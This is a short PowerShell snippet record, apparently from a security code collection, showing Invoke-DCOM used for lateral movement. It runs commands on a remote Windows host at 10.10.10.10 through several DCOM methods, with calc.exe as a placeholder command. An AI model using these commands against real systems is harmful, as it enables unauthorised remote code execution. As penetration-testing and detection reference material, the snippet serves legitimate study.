---
id: 8ea166f2-0eab-4dea-ba71-b50f0f514afc
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:07.043373+00:00'
updated_at: '2023-04-10T20:26:18.158632+00:00'
---

# Code Snippet 8ea166f2

**Language**: Powershell

```powershell
Import-Module .\Invoke-DCOM.ps1
Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command "calc.exe"
Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command "calc.exe"
Invoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart "MyService"
Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command "calc.exe"
Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command "calc.exe"
```
